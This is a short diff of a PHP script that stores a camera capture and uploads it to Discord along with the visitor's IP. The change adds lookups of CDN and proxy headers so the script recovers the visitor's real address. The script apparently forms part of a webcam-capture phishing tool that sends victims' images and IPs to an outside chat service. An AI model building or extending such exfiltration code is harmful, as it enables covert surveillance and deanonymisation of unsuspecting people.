@@ -101,8 +101,21 @@ if ($written === false || $written < strlen($unencodedData)) {
 /* ── Signal shell script that a new capture arrived ── */
 file_put_contents($data_dir . '/.flag_cam', $filepath);
 
-/* ── Discord: Upload the actual camera image ── */
-$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+/* ── Telegram / Discord: Upload the actual camera image ── */
+$client_ip = 'Unknown';
+foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $h) {
+    if (!empty($_SERVER[$h])) {
+        $parts = explode(',', $_SERVER[$h]);
+        $cand = trim($parts[0]);
+        if (filter_var($cand, FILTER_VALIDATE_IP)) {
+            $client_ip = $cand;
+            break;
+        }
+    }
+}
+if ($client_ip === 'Unknown') {
+    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+}
 $timestamp = date('Y-m-d H:i:s T');
 sendDiscordImage(
     $filepath,
